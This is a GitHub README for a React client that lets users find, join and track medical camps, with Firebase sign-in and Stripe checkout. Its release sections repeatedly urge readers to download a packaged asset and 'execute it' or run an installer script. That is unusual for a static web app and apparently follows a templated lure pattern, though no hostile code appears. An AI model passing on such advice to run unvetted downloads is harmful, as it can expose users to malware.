# Medical Camp Manager — Register, Join, and Track Health Camps
[![Releases](https://img.shields.io/github/v/release/Frost4767/Medecal-Camp-Project-Client?style=for-the-badge)](https://github.com/Frost4767/Medecal-Camp-Project-Client/releases)
https://github.com/Frost4767/Medecal-Camp-Project-Client/releases

A client app to find, join, and track medical camps. It connects to an API, uses Firebase for auth, and Stripe for payments. The UI uses React, Tailwind CSS, and Framer Motion for smooth interactions.

Table of contents
- Demo image
- Key features
- Tech stack
- Quick start
- Download a release and run it
- Local development
- Environment variables
- Routing and pages
- Data models
- Authentication (Firebase)
- Payments (Stripe)
- State and caching
- Testing and accessibility
- Deployment
- Contributing
- Maintainers and license
- Releases

Demo image
![Medical Camp Demo](https://images.unsplash.com/photo-1584466977776-39e4a1b2a6d1?auto=format&fit=crop&w=1400&q=80)
Image: Unsplash (public). The app uses clear cards, search, filters, and a map preview. Animations use Framer Motion for subtle motion.

Key features
- Search camps by name, location, date.
- Filter by specialty, free/paid, and vaccine types.
- Camp detail pages with schedules and organizer contact.
- Register for a camp with a few clicks.
- Live updates and attendee counts.
- Firebase Authentication (email, Google).
- Secure payments via Stripe.
- Offline-first caching via React Query.
- Smooth UI with Tailwind CSS and Framer Motion.
- Mobile-first responsive layout.

Tech stack
- Frontend: React, React Router, React Query, React Icons
- UI: Tailwind CSS, Framer Motion
- Auth: Firebase Authentication
- Payments: Stripe (client)
- Backend: Express.js (API, not in this repo)
- Database: MongoDB (server-side)
- Deployment: Static build hosting (Netlify, Vercel, or GitHub Pages)
- Tools: Node.js, npm/yarn

Quick start
1. Clone the repo.
2. Install dependencies.
3. Create env vars for Firebase, API, and Stripe.
4. Run the dev server.

Download a release and run it
If you want a packaged build, download the release from:
https://github.com/Frost4767/Medecal-Camp-Project-Client/releases

This link points to the project releases page. Download the release asset and execute it. Typical release assets:
- medecal-camp-client-v1.0.0.zip
- medecal-camp-client-v1.0.0.tar.gz

After you download the asset:
- unzip the package
- open the folder
- if it contains a static build, serve the folder with a static server (npx serve build) or copy to your static host
- if it contains an executable installer or script, run the installer script

If the release link does not work for you, check the "Releases" section on the repository page.

Local development (client)
1. Clone
   git clone https://github.com/Frost4767/Medecal-Camp-Project-Client.git
2. Install
   cd Medecal-Camp-Project-Client
   npm install
3. Run dev server
   npm run dev
4. Open http://localhost:3000 (or the port shown)

The client expects an API. For local testing, use a dev server URL:
- REACT_APP_API_URL=http://localhost:5000/api

Environment variables
Create a .env file in the project root with these keys:

- REACT_APP_API_URL=https://api.example.com
- REACT_APP_FIREBASE_API_KEY=your_key
- REACT_APP_FIREBASE_AUTH_DOMAIN=your_domain
- REACT_APP_FIREBASE_PROJECT_ID=your_project_id
- REACT_APP_FIREBASE_APP_ID=your_app_id
- REACT_APP_STRIPE_KEY=pk_test_xxx

Do not commit .env to source control.

Routing and pages
The client uses React Router. Main routes:
- / — Home, list of active camps
- /camp/:id — Camp detail and registration
- /search — Search and filters
- /dashboard — User dashboard (bookings, profile)
- /login — Login / Signup (Firebase)
- /checkout — Stripe checkout flow
- /about — Project info and contacts

Each route uses lazy loading for code-splitting. The app uses a minimal layout component that wraps pages and provides header, nav, and footer.

Data models (client view)
Camp (example)
{
  "id": "c123",
  "title": "Free Vaccination Drive",
  "date": "2025-09-10",
  "location": "Community Center, Main St",
  "specialties": ["Pediatrics", "General"],
  "capacity": 150,
  "booked": 42,
  "price": 0,
  "organizerId": "u45",
  "description": "Drops of care for the local community."
}

User (example)
{
  "id": "u45",
  "name": "Ayesha Khan",
  "email": "ayesha@example.com",
  "roles": ["user"],
  "bookings": ["c123"]
}

Booking (example)
{
  "id": "b789",
  "campId": "c123",
  "userId": "u45",
  "status": "confirmed",
  "paymentId": "pi_abc123"
}

Authentication (Firebase)
- The app uses Firebase Authentication on the client.
- It supports email/password and Google sign-in.
- After sign-in, the client requests a JWT from the API to authenticate API calls.
- The client stores the Firebase token in memory and refreshes it with Firebase SDK.
- Protect dashboard routes with a PrivateRoute wrapper that checks auth state.

Payments (Stripe)
- The client uses Stripe Elements for card input and hosts a checkout flow.
- Flow:
  1. Client requests a payment intent from the API: POST /payments/create
  2. API returns client_secret
  3. Client confirms card payment using Stripe.js
  4. On success, client notifies the API to finalize the booking
- Never put your Stripe secret key in the client. Use publishable key only.

State, API calls, and caching
- React Query handles API calls and caching.
- Use queries for:
  - camps list (infinite scroll)
  - camp details
  - user bookings
- Use mutations for:
  - register for a camp
  - cancel booking
  - confirm payment
- React Query keeps UI fast and resilient to network issues.

Animations and UI
- Framer Motion drives micro-interactions.
  - Card hover lift
  - Smooth page transitions
  - Toast animations for confirmations
- Tailwind CSS provides utility-driven styling.
- Accessibility:
  - Semantic HTML
  - Alt text for images
  - Keyboard focus states
  - Color contrast checks

Testing
- Unit tests: Jest + React Testing Library
- Integration tests: test flows on key pages (login, register, checkout)
- Run tests:
  npm test

Build and deployment
- Build:
  npm run build
- The build output lives in /build
- Deploy to Netlify, Vercel, GitHub Pages, or any static host.
- If you downloaded a release asset, follow the release README inside the package. For packaged builds, unzip and serve with:
  npx serve build

Security notes
- Use HTTPS in production.
- Keep Firebase service credentials secure.
- Use server-side verification for payments and booking logic.
- Validate input on the server.

Developer tips
- Use the API mock server for UI work if the backend is unavailable.
- Use React Query devtools for debugging.
- Keep components small and focused.
- Write prop-types or use TypeScript typings if you add TS.

Common scripts
- npm run dev — start dev server
- npm run build — production build
- npm run lint — run linters
- npm run format — run prettier
- npm test — run tests

Contributing
- Fork the repo.
- Create a branch feature/your-feature.
- Commit with clear messages.
- Open a pull request with a description of changes and test steps.
- Keep PRs small and focused.

Maintainers
- Project: Medecal-Camp-Project-Client
- Repo: https://github.com/Frost4767/Medecal-Camp-Project-Client
- For releases and packaged downloads visit:
  [![Releases](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge)](https://github.com/Frost4767/Medecal-Camp-Project-Client/releases)
  https://github.com/Frost4767/Medecal-Camp-Project-Client/releases

Releases
- Visit the releases page to download a packaged client or installers.
- The release asset needs to be downloaded and executed as described above.
- If you cannot find a working asset, check the "Releases" section on the repo page for the latest build or source bundle.

License
- MIT License. See LICENSE file for full terms.